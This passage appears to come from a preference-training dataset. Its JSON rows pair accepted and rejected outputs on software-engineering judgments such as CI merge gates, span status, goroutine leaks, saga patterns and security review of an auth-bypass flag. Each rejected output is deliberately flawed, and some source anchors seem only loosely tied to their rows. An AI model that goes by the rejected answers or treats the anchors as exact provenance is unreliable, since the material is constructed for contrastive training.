    "implementation": "def validate_config(config: dict, schema: dict) -> list[str]:\n    errors = []\n    type_map = {'str': str, 'int': int, 'bool': bool, 'list': list}\n    for field, rules in schema.items():\n        if field not in config:\n            if rules.get('required', False):\n                errors.append(f'{field}: required field missing')\n            continue\n        value = config[field]\n        expected_type = type_map.get(rules.get('type', 'str'), str)\n        if not isinstance(value, expected_type):\n            errors.append(f'{field}: expected {rules[\"type\"]}, got {type(value).__name__}')\n            continue\n        min_val = rules.get('min')\n        max_val = rules.get('max')\n        if rules.get('type') == 'str':\n            if min_val is not None and len(value) < min_val:\n                errors.append(f'{field}: length {len(value)} below min {min_val}')\n            if max_val is not None and len(value) > max_val:\n                errors.append(f'{field}: length {len(value)} exceeds max {max_val}')\n        elif rules.get('type') == 'int':\n            if min_val is not None and value < min_val:\n                errors.append(f'{field}: value {value} below min {min_val}')\n            if max_val is not None and value > max_val:\n                errors.append(f'{field}: value {value} exceeds max {max_val}')\n    return errors"
  },
  "rejectedOutput": {
    "implementation": "def validate_config(config, schema):\n    for field, rules in schema.items():\n        if rules['required'] and field not in config:\n            return [f'{field} is missing']\n        if field in config and type(config[field]).__name__ != rules['type']:\n            return [f'{field} wrong type']\n    return []"
  },
  "arbiters": ["implementationCorrectnessArbiter"],
  "whyAccepted": "The accepted implementation: collects all errors (uses append, not return on first error); handles None bounds correctly; uses isinstance for type checking (not type().__name__ which fails for bool: isinstance(True, int) is True in Python — the rejected output would also have this bug); applies str length vs int value bound logic correctly.",
  "whyRejected": "The rejected implementation: returns on first error (misses remaining field errors); uses type().__name__ string comparison which is fragile; accesses rules['required'] without .get() (KeyError if 'required' key is absent); does not implement min/max range checking.",
  "sourceAnchors": [
    {
      "sourceId": "BIGCODEBENCH",
      "url": "https://github.com/bigcode-project/bigcodebench",
      "section": "Configuration validation task — multi-error collection, type and range checking",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-162

```json
{
  "rowId": "EXT-162",
  "sourceIds": ["SWE-BENCH"],
  "sourceTrustTier": 1,
  "datasetFamily": "domainResultsArray_to_resultI",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "ci-result-aggregation-with-gate",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Aggregate these three CI domain results for a pull request. The PR introduces changes to a TypeScript codebase. Apply the merge gate policy: tests must pass, type errors block merge, lint errors (not warnings) block merge.",
    "b": "test_result = { status: 'SUCCESS', passed: 89, failed: 0 }; typecheck_result = { status: 'FAIL', errors: [ { file: 'src/api/handler.ts', line: 42, error: 'Type string is not assignable to type number' } ] }; lint_result = { status: 'FAIL', errors: [ { rule: 'no-unused-vars', severity: 'error', count: 2 } ], warnings: [ { rule: 'max-line-length', severity: 'warning', count: 3 } ] }",
    "c": "Context: domainResultsArray_to_resultI with merge gate policy. Tests pass — no block. Type errors: 1 error — merge blocked. Lint errors (severity=error): 2 violations — merge blocked. Lint warnings: 3 violations — advisory, not blocking. The resultI must list the specific blocking items and the advisory items separately."
  },
  "function": "Aggregate the three CI results into a resultI with BLOCK status. List the specific blocking items and the non-blocking advisory.",
  "acceptedOutput": {
    "resultI": {
      "requestId": "req_pr_check_7743",
      "overallStatus": "BLOCK",
      "mergeReady": false,
      "mergeBlockers": [
        {
          "tool": "typecheck",
          "type": "type-error",
          "location": "src/api/handler.ts:42",
          "detail": "Type string is not assignable to type number"
        },
        {
          "tool": "lint",
          "type": "lint-error",
          "rule": "no-unused-vars",
          "count": 2,
          "severity": "error"
        }
      ],
      "advisory": [
        {
          "tool": "lint",
          "type": "lint-warning",
          "rule": "max-line-length",
          "count": 3,
          "severity": "warning",
          "blocksMerge": false
        }
      ],
      "passed": [
        { "tool": "tests", "passed": 89, "failed": 0 }
      ],
      "arbitrationTargets": ["ciMergeGateArbiter"]
    }
  },
  "rejectedOutput": {
    "resultI": {
      "overallStatus": "FAIL",
      "reason": "Tests passed but typecheck and lint failed."
    }
  },
  "arbiters": ["ciMergeGateArbiter"],
  "whyAccepted": "The accepted resultI distinguishes blocker types (type error vs lint error), includes the specific location and rule for each blocker (enabling targeted fixes), separates the advisory lint warning from blocking lint errors, and confirms what passed (tests). A developer can act directly on this resultI.",
  "whyRejected": "The rejected output provides no actionable detail — which file, which type error, which lint rule, how many violations. A developer who receives 'typecheck and lint failed' must re-run both tools to find the specific issues.",
  "sourceAnchors": [
    {
      "sourceId": "SWE-BENCH",
      "url": "https://github.com/swe-bench/SWE-bench",
      "section": "CI gate aggregation — merge blocker vs advisory separation with specific error location",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-163

```json
{
  "rowId": "EXT-163",
  "sourceIds": ["OPENTELEMETRY-SPEC"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "E_ARBITER_QUALITY",
  "subdomain": "observability-span-status",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this OpenTelemetry instrumentation result: a service sets the span status to SpanStatus.OK when it receives an HTTP 404 response from an upstream dependency.",
    "b": "const span = tracer.startSpan('fetch-user'); const response = await httpClient.get('/users/not-existing-id'); if (response.status === 404) { span.setStatus({ code: SpanStatusCode.OK }); // 'not found is expected, not an error' } else { span.setStatus({ code: SpanStatusCode.ERROR }); }",
    "c": "Context: OpenTelemetry Span Status semantics (OTLP spec). SpanStatusCode.OK means 'the operation completed successfully from the perspective of the calling service.' SpanStatusCode.ERROR means 'the operation encountered an error.' SpanStatusCode.UNSET means 'status was not set.' A 404 from an upstream dependency is an error for the span that was trying to fetch a user — the fetch failed because the resource does not exist. Setting OK on a failed fetch causes the span to appear successful in distributed traces, hiding the dependency error from dashboards and alerting."
  },
  "function": "Apply tracePropagationArbiter: detect incorrect SpanStatus assignment that masks upstream errors. Identify the correct status for a 404 response.",
  "acceptedOutput": {
    "decision": "REJECT. SpanStatusCode.OK on a 404 response masks the upstream error in distributed traces. A 404 (Not Found) from an upstream service means the fetch-user operation failed to retrieve the requested resource — the span should be ERROR. The developer's reasoning ('not found is expected, not an error') confuses application-level semantics with span telemetry semantics: at the application level, 404 may be a handled case; at the trace level, the operation did not complete successfully.",
    "reprocessInstruction": "if (response.status === 404) { span.setStatus({ code: SpanStatusCode.ERROR, message: 'User not found (404)' }); span.setAttribute('http.response.status_code', 404); } span.setStatus({ code: SpanStatusCode.OK }) only when the operation succeeded (2xx response). Let the calling code handle the 404 as an expected business case — but record it as a span error so distributed trace analysis shows the upstream 404 rate correctly."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. A 404 is a client error, not a server error. The service handled it correctly by treating it as an expected case. The span should not be ERROR."
  },
  "arbiters": ["tracePropagationArbiter"],
  "whyAccepted": "SpanStatus.OK does not mean 'the application handled this gracefully' — it means 'the operation succeeded.' A 404 is a failed fetch, not a successful one. Error handling at the application layer (branching on 404) is orthogonal to telemetry accuracy. Both can coexist: mark the span ERROR and handle the 404 gracefully in application code.",
  "whyRejected": "The rejected output applies HTTP status code semantics (4xx = client error, not server error) to span status semantics, which are different. The span status codes (OK, ERROR, UNSET) measure the operation's success from the observability perspective, not from the server's HTTP perspective.",
  "sourceAnchors": [
    {
      "sourceId": "OPENTELEMETRY-SPEC",
      "url": "https://github.com/open-telemetry/opentelemetry-specification",
      "section": "Span status — SpanStatusCode.OK vs ERROR; 404 response marks span as ERROR for trace analysis",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-164

```json
{
  "rowId": "EXT-164",
  "sourceIds": ["GOOGLE-AIP"],
  "sourceTrustTier": 1,
  "datasetFamily": "machineCommand_to_machineActionItems",
  "domain": "B_ROUTING_SELECTION",
  "subdomain": "api-filter-design",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Decompose this API filter requirement: the GET /products endpoint needs to support filtering by status (active, inactive, archived), price range (min_price, max_price), and category. Multiple statuses can be filtered simultaneously (e.g., active and archived but not inactive).",
    "b": "Available approaches: (1) individual query parameters: ?status=active&status=archived&min_price=10&max_price=100&category=electronics; (2) Google AIP-160 filter string: ?filter=status IN ('active', 'archived') AND price >= 10 AND price <= 100 AND category = 'electronics'",
    "c": "Context: Google AIP-160 filter expressions. AIP-160 defines a structured filter string syntax that is expressive for complex queries, self-documenting in API calls, and extensible without adding new query parameters. Individual query parameters work for simple single-value filters but require per-parameter combinatorial logic for multi-value cases (status=active&status=archived requires list handling)."
  },
  "function": "Produce the action items for implementing the filter as AIP-160 filter string. Specify the filter parser requirements and the query translation.",
  "acceptedOutput": {
    "actionItems": [
      "Action 1: Define the filter string endpoint: GET /products?filter=<AIP-160 expression>. Example: GET /products?filter=status IN ('active','archived') AND price >= 10.00 AND price <= 100.00 AND category = 'electronics'",
      "Action 2: Implement a filter expression parser that supports: field comparisons (field = value, field != value), range comparisons (field >= value, field <= value), set membership (field IN (v1, v2, v3)), logical combination (AND, OR), and parenthesization for precedence.",
      "Action 3: Map parsed filter AST (Abstract Syntax Tree) nodes to database query predicates. Example: status IN ('active','archived') → WHERE status IN ('active', 'archived'). Price comparisons → parameterized WHERE clauses.",
      "Action 4: Validate field names against an allowlist — reject filter expressions that reference fields not in the allowlist to prevent arbitrary column access.",
      "Action 5: Return 400 Bad Request with a descriptive error message for malformed filter expressions: { 'error': { 'code': 400, 'message': 'Invalid filter expression: unrecognized field \"color\"', 'status': 'INVALID_ARGUMENT' } }"
    ]
  },
  "rejectedOutput": {
    "actionItems": [
      "Add ?status=, ?min_price=, ?max_price=, and ?category= query parameters.",
      "In the handler, build the WHERE clause from the present parameters."
    ]
  },
  "arbiters": ["apiFilterDesignArbiter"],
  "whyAccepted": "The AIP-160 filter string approach is specified by Google's API Design Guide as the standard for complex filter expressions. It handles multi-value set membership (IN), range predicates, and logical combination in a single extensible parameter. Adding a new filterable field requires only parser allowlist update, not a new query parameter.",
  "whyRejected": "Individual query parameters work for the current 4 filters but require parameter explosion for complex cases (status allows 3 values in various combinations; price range requires two parameters; combining with AND/OR is not expressible in simple query parameters). The rejected decomposition does not address multi-value status filtering.",
  "sourceAnchors": [
    {
      "sourceId": "GOOGLE-AIP",
      "url": "https://google.aip.dev/160",
      "section": "AIP-160 Filtering — filter string syntax, IN operator, AND/OR composition",
      "license": "CC-BY-4.0"
    }
  ],
  "licenseConstraint": "CC-BY-4.0 — attribution required",
  "trainingStatus": "candidate"
}
```

---

## EXT-165

```json
{
  "rowId": "EXT-165",
  "sourceIds": ["KUBERNETES-KEPS"],
  "sourceTrustTier": 1,
  "datasetFamily": "historyAndVersions_to_reprocessingDecision",
  "domain": "H_GOVERNANCE",
  "subdomain": "feature-gate-lifecycle",
  "rowClass": "migration-decision",
  "input": {
    "a": "Reprocessing decision: a Kubernetes KEP feature is currently at Alpha (feature gate: --feature-gates=PodDisruptionConditions=true). The KEP authors want to promote it to Beta. The feature has been in Alpha for two releases. User feedback reports 2 minor issues (both fixed). No data on adoption rate.",
    "b": "History: KEP-3329 PodDisruptionConditions. Alpha in 1.25, 1.26. Issues filed: 2 (both resolved as of 1.26). No graduation criteria tracking adoption metrics yet. The Beta graduation criteria per Kubernetes KEP process: (1) conformance tests written and passing, (2) e2e tests in TestGrid, (3) at least two production users, (4) no outstanding bugs labeled as blocker.",
    "c": "Context: Kubernetes KEP graduation process. Alpha → Beta requires the team to document and meet graduation criteria before the promotion. The missing adoption data ('no data on adoption rate') is a gap — the Beta graduation criterion requires 'at least two production users.' The feature gate must remain Alpha until this criterion is met."
  },
  "function": "Produce the reprocessing decision for Alpha → Beta promotion. Identify which graduation criteria are met and which are blocking.",
  "acceptedOutput": {
    "reprocessingDecision": "BLOCK promotion — graduation criteria incomplete.",
    "criteriaStatus": [
      { "criterion": "Conformance tests written and passing", "status": "UNKNOWN — not confirmed in the KEP. Must verify before promotion." },
      { "criterion": "E2E tests in TestGrid", "status": "UNKNOWN — not confirmed. Required for Beta." },
      { "criterion": "At least two production users", "status": "NOT MET — adoption rate unknown. Two production users must be identified and confirmed (documented in the KEP)." },
      { "criterion": "No outstanding blocker bugs", "status": "MET — 2 issues resolved." }
    ],
    "nextSteps": [
      "Confirm conformance test coverage and add to the KEP graduation criteria tracking table.",
      "Add e2e tests to TestGrid and confirm green status.",
      "Identify and document at least two production users. The Kubernetes KEP template has a 'Production Readiness Review' section for this.",
      "Once all criteria are met, open a promotion PR targeting the next release."
    ]
  },
  "rejectedOutput": {
    "reprocessingDecision": "Promote to Beta. The feature has been stable in Alpha for two releases and all filed issues are resolved. Stability over time is sufficient for Beta promotion."
  },
  "arbiters": ["featureGateLifecycleArbiter"],
  "whyAccepted": "Time-in-alpha and issue resolution are necessary but not sufficient conditions for Beta promotion. The Kubernetes KEP process explicitly requires production users for Beta — this is a signal of real-world stability beyond what the development team's own testing can provide.",
  "whyRejected": "The rejected output uses two proxies (time-in-alpha, issues resolved) as substitutes for the actual graduation criteria. Stability over time in a test environment does not replace evidence of production adoption, which is the criterion that Beta promotion signals to the broader Kubernetes ecosystem.",
  "sourceAnchors": [
    {
      "sourceId": "KUBERNETES-KEPS",
      "url": "https://github.com/kubernetes/enhancements",
      "section": "KEP graduation criteria — Alpha to Beta requirements: conformance tests, e2e, production users",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```

---

## EXT-166

```json
{
  "rowId": "EXT-166",
  "sourceIds": ["DOTNET-MICROSERVICES", "ESHOP-ON-WEB"],
  "sourceTrustTier": 1,
  "datasetFamily": "userPrompt_to_machineCommands",
  "domain": "A_TOPOLOGY",
  "subdomain": "saga-pattern-selection",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "We're implementing a multi-step order fulfillment flow: reserve inventory → charge payment → send confirmation email → dispatch shipping. Each step must be compensatable if a later step fails. We have a team of 4 developers and this is our first distributed transaction in this system. Should we use Saga Orchestration or Saga Choreography?",
    "b": "Context: the team is new to sagas. The flow has 4 steps with 4 compensating actions. The system uses a message broker (RabbitMQ). All 4 services (Inventory, Payment, Email, Shipping) are internal microservices.",
    "c": "Context: Saga pattern selection. Orchestration: a central SagaOrchestrator service sends commands to each participant and handles compensations centrally. Choreography: each service emits an event when complete; the next service listens and reacts. Orchestration is easier to reason about and debug for teams new to sagas; choreography has no single point of failure but creates implicit coupling through event chains."
  },
  "function": "Produce the command: which saga pattern to use and the conditions that would reverse the recommendation.",
  "acceptedOutput": {
    "command": "Use Saga Orchestration for this flow.",
    "rationale": "Three factors favor orchestration: (1) Team experience — first distributed transaction. Orchestration makes the entire saga flow visible in one place (the orchestrator class). When something goes wrong, the orchestrator's state shows exactly which step failed and which compensations were triggered. In choreography, debugging requires tracing events across 4 services. (2) 4-step linear flow — orchestration is ideal for linear flows. Choreography's parallel event handling benefits apply to non-linear flows where events branch. (3) Compensation clarity — the orchestrator owns all compensation logic. In choreography, each service must know which compensating event to emit and each upstream service must listen for it — implicit coupling that grows with the number of steps.",
    "conditionsToChangeRecommendation": "Prefer choreography if: (a) the flow is non-linear (multiple parallel branches), (b) the team is experienced with event-driven sagas and finds choreography's decoupling valuable, or (c) the orchestrator becomes a deployment bottleneck (all saga flows bottlenecked through one service)."
  },
  "rejectedOutput": {
    "command": "Use Saga Choreography — it is more resilient because there is no central point of failure."
  },
  "arbiters": ["sagaPatternSelectionArbiter"],
  "whyAccepted": "Resilience to single-point-of-failure is a valid argument for choreography, but the orchestrator can be made highly available (multiple instances). For a team new to sagas, the debugging complexity of choreography outweighs its resilience benefit. The orchestrator's observability advantage directly reduces incident response time during the team's learning curve.",
  "whyRejected": "The rejected output selects choreography on a single criterion (no central point of failure) without weighing it against the team experience and debuggability criteria. For a team's first distributed transaction, 'harder to debug' is a critical factor that the rejected output ignores.",
  "sourceAnchors": [
    {
      "sourceId": "DOTNET-MICROSERVICES",
      "url": "https://github.com/dotnet-architecture/eShopOnContainers",
      "section": "Saga pattern — orchestration vs choreography selection criteria",
      "license": "MIT"
    }
  ],
  "licenseConstraint": "MIT",
  "trainingStatus": "candidate"
}
```

---

## EXT-167

```json
{
  "rowId": "EXT-167",
  "sourceIds": ["PROJECT-GUTENBERG"],
  "sourceTrustTier": 1,
  "datasetFamily": "machineActionItem_to_domainResult",
  "domain": "C_SEMANTIC_TRANSLATION",
  "subdomain": "text-normalization",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Implement text normalization for a Project Gutenberg source document to be used in a training corpus. The raw text contains: UTF-8 smart quotes (“”‘’), em-dashes (—), multiple consecutive spaces, line-ending hyphens from page layout (e.g., 'ex-\\nample'), and OCR artifacts ('[illustration: description]', '* * * * *' separators).",
    "b": "Sample raw text: “The quick—or rather slow—fox jumped\\nover the fence.\\nShe said, \\u2018hello.\\u2019\\n\\n[Illustration: Fox jumping.]\\n\\n* * * * *\\n\\nThe next chapter be-\\ngins here.\"",
    "c": "Context: Project Gutenberg text (public domain). Normalization for training corpus must: preserve semantic content, normalize typography to ASCII or UTF-8 standard forms, rejoin hyphenated words split across lines, remove non-prose artifacts ([Illustration:...], * * * separators), and normalize whitespace. The output must be clean UTF-8 prose."
  },
  "function": "Implement the normalization pipeline as ordered steps. Produce the normalized output for the sample text.",
  "acceptedOutput": {
    "normalizationSteps": [
      "Step 1: Rejoin line-ending hyphens: replace '(\\w+)-\\n(\\w+)' with '\\1\\2'. Captures: 'be-\\ngins' → 'begins'. Must run before whitespace normalization.",
      "Step 2: Remove OCR artifacts: remove '[Illustration: .*?]' patterns and '* * * *' separators (and variants with different spacing).",
      "Step 3: Normalize smart quotes to standard ASCII: '\\u201c' → '\"', '\\u201d' → '\"', '\\u2018' → \"'\", '\\u2019' → \"'\".",
      "Step 4: Normalize em-dash: '\\u2014' → ' -- ' (with spaces) or ' - ' depending on corpus convention. For prose, ' -- ' preserves the dash's syntactic role as a parenthetical delimiter.",
      "Step 5: Collapse whitespace: replace multiple spaces, tabs, and mixed newlines with single space. Replace paragraph breaks (\\n\\n) with a paragraph separator token if needed, or a single newline.",
      "Step 6: Strip leading/trailing whitespace from the result."
    ],
    "normalizedOutput": "\"The quick -- or rather slow -- fox jumped over the fence. She said, 'hello.'\n\nThe next chapter begins here.\""
  },
  "rejectedOutput": {
    "normalizationSteps": [
      "Strip all non-ASCII characters.",
      "Replace newlines with spaces."
    ],
    "normalizedOutput": "\"The quick--or rather slow--fox jumped over the fence. She said, hello. The next chapter begins here.\""
  },
  "arbiters": ["textNormalizationArbiter"],
  "whyAccepted": "The accepted pipeline: preserves quotes (removes smart-quote distinction but keeps the quoted span intact), handles line-break hyphens before whitespace normalization (preventing incorrect word joins), preserves paragraph breaks (paragraph structure is semantically significant for training), and removes OCR artifacts without destroying adjacent text.",
  "whyRejected": "The rejected pipeline strips all non-ASCII characters — this removes smart quotes as empty strings, losing the quoted span boundary signal. Replacing all newlines with spaces collapses paragraph structure and produces 'line.The' run-ons when there is no trailing space before the newline. The output shows 'hello.' without quotes (the 'strip non-ASCII' step removed the single quotes).",
  "sourceAnchors": [
    {
      "sourceId": "PROJECT-GUTENBERG",
      "url": "https://www.gutenberg.org",
      "section": "Plain text corpus — OCR artifact patterns, smart quote normalization, hyphen rejoining",
      "license": "Public domain"
    }
  ],
  "licenseConstraint": "none",
  "trainingStatus": "candidate"
}
```

---

## EXT-168

```json
{
  "rowId": "EXT-168",
  "sourceIds": ["EFFECTIVE-GO"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "goroutine-lifecycle",
  "rowClass": "anti-pattern-detection",
  "input": {
    "a": "Arbitrate this Go result: a web handler spawns a goroutine to perform background processing. The goroutine runs an infinite loop that reads from a channel. When the HTTP request completes, the goroutine continues running with no cancellation mechanism.",
    "b": "func (h *Handler) ServeHTTP(w http.ResponseWriter, r *http.Request) { go func() { for msg := range h.msgChannel { process(msg) } }() w.WriteHeader(http.StatusAccepted) } — a new goroutine is spawned per request. The goroutine reads from h.msgChannel indefinitely. When requests accumulate, goroutines accumulate.",
    "c": "Context: Effective Go goroutine lifecycle. A goroutine spawned per request with no cancellation creates a goroutine leak if: (a) h.msgChannel is never closed (the for-range loop never exits), or (b) requests come faster than processing completes (goroutine count grows unbounded). Both conditions apply here: msgChannel is a shared channel (not closed per request), and the handler spawns one goroutine per incoming request."
  },
  "function": "Apply goroutineLeakArbiter: detect goroutines spawned without cancellation that accumulate over the server's lifetime. Identify the leak mechanism and produce the correct pattern.",
  "acceptedOutput": {
    "decision": "REJECT. Goroutine leak. Each HTTP request spawns a goroutine that reads from h.msgChannel indefinitely. h.msgChannel is a shared channel — it is never closed by this goroutine, so for msg := range h.msgChannel never exits. Goroutines accumulate per request. Under load (100 requests/second), 100 goroutines/second are created; at processing rate of 80 messages/second, 20 goroutines/second accumulate. After 5 minutes: 6,000 leaked goroutines consuming stack memory and channel read resources.",
    "reprocessInstruction": "Spawn the background processor once at server startup, not per request. Use a context for cancellation: ctx, cancel := context.WithCancel(context.Background()); go func() { for { select { case msg, ok := <-h.msgChannel: if !ok { return } process(msg); case <-ctx.Done(): return } } }() Pass ctx and cancel to the handler; call cancel() in server shutdown. Per-request, send to the channel (h.msgChannel <- newMsg) without spawning a new goroutine."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The goroutine will exit when h.msgChannel is closed. Goroutines are lightweight — the memory cost is low."
  },
  "arbiters": ["goroutineLeakArbiter"],
  "whyAccepted": "h.msgChannel is a shared channel that is never closed per the code shown. 'Will exit when closed' is true but the close never happens in the handler — the goroutine leaks indefinitely. 'Goroutines are lightweight' (2–8 KB initial stack) is true, but 6,000 goroutines × 8 KB = 48 MB and growing — not lightweight at scale.",
  "whyRejected": "The rejected output assumes the channel will be closed (not shown in the code) and dismisses the memory cost with 'lightweight' without quantifying the accumulation rate. Both arguments are factually incomplete for the specific code pattern.",
  "sourceAnchors": [
    {
      "sourceId": "EFFECTIVE-GO",
      "url": "https://go.dev/doc/effective_go",
      "section": "Goroutines — lifecycle management; per-request goroutine spawn without cancellation is a leak",
      "license": "CC-BY-4.0"
    }
  ],
  "licenseConstraint": "CC-BY-4.0 — attribution required",
  "trainingStatus": "candidate"
}
```

---

## EXT-169

```json
{
  "rowId": "EXT-169",
  "sourceIds": ["NIST-SSDF"],
  "sourceTrustTier": 1,
  "datasetFamily": "arbitrateResultI_with_resultsContext",
  "domain": "H_GOVERNANCE",
  "subdomain": "code-review-security-gate",
  "rowClass": "arbiter-construction",
  "input": {
    "a": "Arbitrate this code review process result: a team's code review process requires two approvals from any team member before merge. A security-critical change (adding a new authentication bypass flag for testing) was merged with two approvals from junior developers, neither of whom has security training.",
    "b": "PR #441: 'Add --skip-auth flag for integration testing.' Approvals: @junior-dev-1, @junior-dev-2. No security team review. The flag is meant to be test-environment-only but the implementation does not validate the environment — it accepts --skip-auth in production if the flag is set.",
    "c": "Context: NIST-SSDF PW.2.2 — Establish and maintain criteria for what constitutes a secure code review for security-impacting changes. A general two-approval policy is insufficient for changes that affect authentication, authorization, cryptography, or input validation. Security-impacting changes require review by personnel with security competency."
  },
  "function": "Apply codeReviewGateArbiter: evaluate whether the existing two-approval policy is sufficient for security-critical changes. Identify the gate that was missing.",
  "acceptedOutput": {
    "decision": "REJECT the process outcome — security gate was missing. NIST-SSDF PW.2.2 requires that security-impacting changes be reviewed by personnel with security competency. The two-approval policy does not distinguish between feature changes and security-critical changes. The --skip-auth flag is an authentication bypass — it requires review by a security-trained engineer or security architect who would: (1) identify that the flag is not environment-gated (accepts --skip-auth in production), (2) require that the flag be disabled at build time in production builds, not at runtime.",
    "reprocessInstruction": "Establish a security-impact label for PRs that affect: authentication, authorization, session management, cryptography, input validation, logging. Labeled PRs require approval from the security team or a designated security reviewer in addition to the standard two approvals. This is NIST-SSDF PW.2.2 — implement it as a branch protection rule: required reviewer groups, not just reviewer count."
  },
  "rejectedOutput": {
    "decision": "ACCEPT. The PR received two approvals per the team's policy. Process was followed correctly."
  },
  "arbiters": ["codeReviewGateArbiter"],
  "whyAccepted": "Policy compliance is not the same as security adequacy. The process was followed — two approvals were obtained. But the process is inadequate for security-critical changes. NIST-SSDF requires that the review process include security competency for security-impacting changes, regardless of general review counts.",
  "whyRejected": "The rejected output evaluates process compliance (correct — the policy was followed) but does not evaluate policy adequacy (inadequate — the policy does not account for security-critical changes). A compliant process that produces a production authentication bypass is a process failure, not a success.",
  "sourceAnchors": [
    {
      "sourceId": "NIST-SSDF",
      "url": "https://csrc.nist.gov/projects/ssdf",
      "section": "PW.2.2 — Security-impacting code review criteria; security competency required for auth changes",
      "license": "Public domain"
    }
  ],
  "licenseConstraint": "none",
  "trainingStatus": "candidate"
}
```

---

## EXT-170

```json
{
  "rowId": "EXT-170",
  "sourceIds": ["BIGCODEBENCH"],
  "sourceTrustTier": 1,
  "datasetFamily": "domainResultsArray_to_resultI",
  "domain": "D_EXECUTION_APPLIER",
  "subdomain": "dependency-resolution-aggregation",
  "rowClass": "tradeoff-decision",
  "input": {
    "a": "Aggregate these domain results from a dependency version compatibility check across three package managers. Produce a resultI that identifies the compatibility matrix and the blocking conflict.",
    "b": "npm_result = { status: 'SUCCESS', resolved: [{ package: 'react', version: '18.2.0' }, { package: 'react-dom', version: '18.2.0' }] }; pip_result = { status: 'SUCCESS', resolved: [{ package: 'requests', version: '2.31.0' }, { package: 'pydantic', version: '2.5.0' }] }; dotnet_result = { status: 'CONFLICT', conflictingPackage: 'Newtonsoft.Json', requestedVersions: ['13.0.1 (required by ServiceA)', '12.0.3 (required by LegacyLib)'], resolution: null }",
    "c": "Context: domainResultsArray_to_resultI for a dependency check across three ecosystems. Two package managers succeeded. One has a version conflict that prevents resolution. The resultI must surface the conflict as a blocking item while confirming the two successful resolutions — the team can proceed with npm and pip while resolving the NuGet conflict separately."
  },
  "function": "Aggregate the three dependency check results into a resultI. Identify the blocking NuGet conflict and confirm the two clean resolutions.",
  "acceptedOutput": {
    "resultI": {
      "requestId": "req_dep_check_multistack",
      "overallStatus": "PARTIAL_BLOCK",
      "summary": {
        "total": 3,
        "succeeded": 2,
        "blocked": 1
      },
      "succeededResolutions": [
        { "ecosystem": "npm", "packages": [{ "package": "react", "version": "18.2.0" }, { "package": "react-dom", "version": "18.2.0" }] },
        { "ecosystem": "pip", "packages": [{ "package": "requests", "version": "2.31.0" }, { "package": "pydantic", "version": "2.5.0" }] }
      ],
      "blockedResolutions": [
        {
          "ecosystem": "dotnet",
          "package": "Newtonsoft.Json",
          "conflict": "ServiceA requires 13.0.1; LegacyLib requires 12.0.3",
          "resolution": null,
          "reprocessAction": "Upgrade LegacyLib to a version compatible with Newtonsoft.Json 13.x, or pin Newtonsoft.Json to 12.x and verify ServiceA works with the lower version."
        }
      ],
      "arbitrationTargets": ["dependencyConflictArbiter"],
      "partialProceedPermitted": true,
      "partialProceedScope": "npm and pip stacks may proceed to deployment. dotnet stack must not deploy until the Newtonsoft.Json conflict is resolved."
    }
  },
  "rejectedOutput": {
    "resultI": {
      "overallStatus": "FAIL",
      "reason": "One of three dependency checks failed."
    }
  },
  "arbiters": ["dependencyConflictArbiter"],
  "whyAccepted": "PARTIAL_BLOCK distinguishes the two independent ecosystems (npm, pip) that resolved cleanly from the NuGet conflict. The npm and pip stacks can deploy independently of the NuGet resolution. Failing the entire multi-stack check because one ecosystem has a conflict prevents independent progress on the other two stacks.",
  "whyRejected": "FAIL with 'one of three failed' loses the information about which ecosystem and which package has the conflict. It also implies all three stacks must wait, when only the dotnet stack is blocked.",
  "sourceAnchors": [
    {
      "sourceId": "BIGCODEBENCH",
      "url": "https://github.com/bigcode-project/bigcodebench",
      "section": "Dependency resolution aggregation — partial block with per-ecosystem status",
      "license": "Apache-2.0"
    }
  ],
  "licenseConstraint": "Apache-2.0",
  "trainingStatus": "candidate"
}
```
